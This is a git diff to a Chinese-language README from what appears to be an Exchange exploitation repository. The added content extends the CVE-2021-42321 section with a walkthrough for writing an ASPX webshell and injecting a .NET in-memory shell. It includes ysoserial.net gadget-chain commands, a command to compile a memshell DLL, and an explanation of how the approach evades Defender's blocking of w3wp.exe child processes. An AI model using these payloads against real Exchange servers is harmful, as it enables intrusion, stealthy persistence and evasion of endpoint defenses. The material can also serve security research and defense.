@@ -307,7 +307,6 @@ Content-Length: 327
  - [CVE-2020-17144 zcgonvh github exp](https://github.com/zcgonvh/CVE-2020-17144)
 
 
-
 # Exchange Authenticated RCE CVE-2021-42321
 ## CVE-2021-42321 part links
 
@@ -337,10 +336,11 @@ Exchange Server 2019 CU11 <= Oct21SU 15.2.986.9 15.02.0986.009
 Exchange Server 2019 CU10 <= Oct21SU 15.2.922.14 15.02.0922.014
 ```
 
-## 漏洞详细复现
-### 直接修改ysoserial.net为写入aspx webshell
+## 直接修改ysoserial.net为写入aspx webshell
 
-实际在利用的过程中遇到的500错误，原因是w3wp进程启动进程被Definder拦截了。这样的话只要修改ysoserial的代码功能为写文件即可利用。
+实际在利用的过程中遇到的500错误，原因是从ProxyLogon, ProxyShell开始，直到现在一些edr,AV,sysmon和Microsoft Windows Defender都试图捕获和阻止来自w3wp.exe进程的衍生进程。所以w3wp进程启动的进程被Definder拦截了。
+
+这样的话只要修改ysoserial的代码功能为写文件即可利用，而不用启动其它进程。
 
 修改后[TypeConfuseDelegateGenerator](./exch_CVE-2021-42321/TypeConfuseDelegateGenerator.cs)
 
@@ -351,7 +351,7 @@ Exchange Server 2019 CU10 <= Oct21SU 15.2.922.14 15.02.0922.014
  - ![](./pics/TypeConfuseDelegateGenerator1.png)
 
 ``` bash
-TypeConfuse链改为写入文件，bypass windows definder禁用w3wp.exe启动进程。
+TypeConfuse链改为写入文件，即可绕过 windows definder 的 w3wp.exe启动进程。
 将此文件覆盖ysoserial.net原始文件，重新编译即可。
 ```
 
@@ -362,8 +362,6 @@ ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "1" -t
 ```
 
 替换原poc中的gadget，即可成功写入webshell
-
- - ![](./pics/TypeConfuseDelegateGenerator1.png)
 
 修改了原poc，添加了写入如下两种shell的gadget chain:
 
@@ -393,13 +391,107 @@ view-source:https://192.168.186.135/aspnet_client/luci.aspx?cmd=Response.Write(n
 
  - ![](./pics/TypeConfuseDelegateGenerator4.png)
 
-### 植入内存马
+## 添加植入内存马gadget chain
 
 change DisableActivitySurrogateSelectorTypeCheck to True to overcome the limitation of .NET and later inject DLL to achieve mem-shell with Jscript to bypass the detection
 
+### .net mem-shell researchs resources
+
+1. 首先在注入memory shell之前，需要将DisableActivitySurrogateSelectorTypeCheck更改为True以绕开.NET的限制，这里使用[ysoserial.net](https://github.com/pwntester/ysoserial.net)官方仓库的ClaimsPrincipal + ActivitySurrogateDisableTypeCheck相结合的gadget chain
+
+Generate a minified BinaryFormatter payload to exploit Exchange CVE-2021-42321 using the ActivitySurrogateDisableTypeCheck gadget inside the ClaimsPrincipal gadget.
+
+``` bash
+.\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateDisableTypeCheck --minify --ust
+```
+
+将这个ClaimsPrincipal+ActivitySurrogateDisableTypeCheck反序列化链添加到[CVE-2021-42321_shell_write_exp.py](./CVE-2021-42321_shell_write_exp.py) exp脚本中
+
+ - ![](./pics/memshell2.png)
+
+ - ![](./pics/memshell3.png)
+
+将DisableActivitySurrogateSelectorTypeCheck更改为True以绕开.NET的限制后，使用弹计算器的TypeConfuseDelegate未修改版本gadget chain在目标上弹出计算器，以确认DisableActivitySurrogateSelectorTypeCheck成功更改为True
+
+ - origin TypeConfuseDelegate chain
+
+``` bash
+.\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "calc" -t
+```
+
+ - ![](./pics/memshell13.png)
+
+2. 此处通过反序列化生成内存马的方式主要参考：
+
+ - [DotNet内存马-HttpListener](https://mp.weixin.qq.com/s/zsPPkhCZ8mhiFZ8sAohw6w)
+ - [.Net 内存马改造](https://cloud.tencent.com/developer/article/1915652)
+ - [Memshell-HttpListener](https://github.com/A-D-Team/SharpMemshell/tree/main/HttpListener)
+
+按照Memshell-HttpListener的github仓库中的说明编译内存马的.dll文件
+
+``` bash
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Web.dll,System.dll,Microsoft.CSharp.dll,System.Core.dll /t:library memshell.cs
+```
+
+编译完之后会在目录下生成一个memshell.dll文件，将其改名为e.dll后续生成反序列化链需要用到
+
+ - [HttpListener - e.dll](./HttpListener/e.dll)
+ - ![](./pics/memshell.png)
+
+将e.dll文件复制到ysoserial.exe的bin目录中
+
+ - ![](./pics/memshell1.png)
+
+现在生成加载e.dll，注入内存马的ClaimsPrincipal + ActivitySurrogateSelector结合的gadget chain
+
+[ActivitySurrogateSelectorGenerator.cs](./ysoserial.net-modified/ysoserial/Generators/ActivitySurrogateSelectorGenerator.cs)文件中加载e.dll的流程
+
+ - ![](./pics/memshell4.png)
+ - ![](./pics/memshell5.png)
+
+及自带的Disable ActivitySurrogate type protections during generation功能
+
+ - ![](./pics/memshell6.png)
+
+``` bash
+.\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateSelector --minify --ust
+```
+
+将这个ClaimsPrincipal+ActivitySurrogateSelector反序列化链添加到[CVE-2021-42321_shell_write_exp.py](./CVE-2021-42321_shell_write_exp.py) exp脚本中
+
+ - ![](./pics/memshell7.png)
+ - ![](./pics/memshell8.png)
+
+ - 本地测试最终exp
+
+1. exp运行前:
+
+ - ![](./pics/memshell9.png)
+
+2. 运行exp脚本，一键注入.net内存马
+
+ - ![](./pics/memshell10.png)
+
+3. 查看内存马命令执行效果
+
+ - ![](./pics/memshell11.png)
+ - ![](./pics/memshell12.png)
 
 
-
+#### note: 后续会另开一个github仓库深入分析.net内存马原理和实战利用方式
+ - [asp.net无法getshell的一些解决办法](https://y4er.com/posts/aspnet-getshell-tips/)
+ - [浅谈DotNET 内存马 Filter](https://www.crisprx.top/archives/547)
+ - [浅谈 DotNet 内存马 Route](https://www.crisprx.top/archives/552)
+ - [浅谈 DotNet 内存马 HttpListener](https://www.crisprx.top/archives/555)
+ - [ASP.NET下的内存马(1) filter内存马](https://tttang.com/archive/1408/)
+ - [ASP.NET下的内存马(2) Route内存马](https://tttang.com/archive/1420/)
+ - [ASP.NET下的内存马(3) HttpListener内存马](https://tttang.com/archive/1451/)
+ - [ASP.NET下的内存马(4) VirtualPath内存马](https://tttang.com/archive/1488/)
+ - [渗透技巧——利用虚拟文件隐藏ASP.NET Webshell](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8FASP.NET-Webshell)
+ - [从内存加载.NET程序集(Assembly.Load)的利用分析](https://3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(Assembly.Load)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90)
+ - [从内存加载.NET程序集(execute-assembly)的利用分析](https://3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(execute-assembly)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90)
+ - [利用JS加载.Net程序](https://3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F)
+ - [通过.NET实现内存加载PE文件](https://3gstudent.github.io/%E9%80%9A%E8%BF%87.NET%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDPE%E6%96%87%E4%BB%B6)
 
 
 ### 修复
@@ -426,7 +518,6 @@ ClientExtensionCollectionFormatter.Deserialize() 改为使用 ExchangeBinaryForm
 2. ClaimsPrincipal 链
 
 开发人员把类名写错，System.Security.ClaimsPrincipal 的正确写法应该是 System.Security.Claims.ClaimsPrincipal,直接改为正确的类名。
-
 
 
 # ProxyRelay
@@ -502,7 +593,9 @@ ClientExtensionCollectionFormatter.Deserialize() 改为使用 ExchangeBinaryForm
  - [ProxyLogon is Just the Tip of the Iceberg](research-pdfs/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf)
  - [Are you my Type? - Breaking .NET Through Serialization](research-pdfs/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
  - [Pwn2Own 2021 Microsoft Exchange Exploit Chain 3rd Vulnerability doc](research-pdfs/pwn2own2021msexchange3rdvulnpdf.docx)
+ - [高级攻防演练下的Webshell](https://github.com/knownsec/KCon/blob/master/2021/%E9%AB%98%E7%BA%A7%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%8B%E7%9A%84Webshell.pdf)
  - []()
+
 
 
 
